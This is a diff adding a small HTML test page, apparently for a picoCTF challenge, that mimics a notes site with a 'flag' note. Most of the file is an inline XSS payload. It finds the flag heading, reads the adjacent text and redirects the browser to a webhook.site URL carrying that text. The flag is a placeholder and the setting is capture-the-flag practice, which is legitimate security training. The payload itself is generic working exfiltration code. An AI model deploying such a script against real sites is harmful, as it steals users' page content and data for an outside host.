@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test XSS Payload</title>
+</head>
+<body>
+    <h1>Testing XSS Payload</h1>
+    
+    <!-- Simulando la estructura de las notas -->
+    <div>
+        <h2>Mi nota normal</h2>
+        <p>Contenido normal</p>
+    </div>
+    <hr>
+    <div>
+        <h2>flag</h2>
+        <p>picoCTF{test_flag_123}</p>
+    </div>
+    <hr>
+    <div>
+        <h2>Nota con XSS</h2>
+        <p>
+        <script>
+        // Payload para robar la flag
+        // Buscar todos los elementos h2
+        var headers = document.getElementsByTagName('h2');
+        for (var i = 0; i < headers.length; i++) {
+            if (headers[i].innerText === 'flag') {
+                // Obtener el siguiente elemento p que contiene la flag
+                var flagContent = headers[i].nextElementSibling.innerText;
+                // Redirigir a una URL con la flag
+                window.location = 'http://webhook.site/test?flag=' + encodeURIComponent(flagContent);
+                break;
+            }
+        }
+        </script>
+        </p>
+    </div>
+    
+</body>
+</html>
